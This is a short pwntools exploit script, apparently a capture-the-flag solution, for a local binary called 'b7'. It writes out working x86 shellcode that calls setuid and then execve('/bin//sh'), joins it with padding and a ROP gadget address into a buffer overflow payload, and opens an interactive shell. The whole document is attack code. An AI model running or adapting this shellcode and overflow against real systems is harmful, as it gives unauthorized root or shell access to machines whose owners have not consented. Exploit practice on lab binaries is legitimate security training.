#Import pwntools
from pwn import *

#Start the binary
target = process('./b7')

#Print the text from the binary to reach fgets
print target.recvline();

#Create the offset
offset = "0"*32

#Declare the shellcode
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Declare the ROP Gadget
gadget = p32(0x08048443)

#Construct the payload
payload = shellcode + offset + gadget

#Let's write the payload to a file, for gdb troubleshooting
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
